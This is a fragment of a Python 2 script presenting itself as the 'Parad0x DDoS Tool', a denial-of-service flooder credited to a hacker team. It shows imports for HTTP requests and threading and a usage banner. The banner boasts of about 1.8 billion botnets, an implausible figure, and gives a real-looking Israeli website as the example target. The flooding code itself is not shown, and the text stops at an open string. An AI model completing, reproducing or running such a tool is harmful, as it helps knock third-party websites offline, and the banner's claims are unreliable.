...
# 
#
# author : X4ph3l & Parad0x Team'z , version 1.0
# ----------------------------------------------------------------------------------------------
import urllib2
import sys
import threading
...
def usage():
	print 'Parad0x DDoS Tool ( individual Dangerous Denial of Service )'
	print 'New loaded Botnets: 1,798,445,657'
	print 'Usage: paraddos (url)'
	print 'Example: paraddos.py http://luthi.co.il/'
	print "\a"
print \
"""
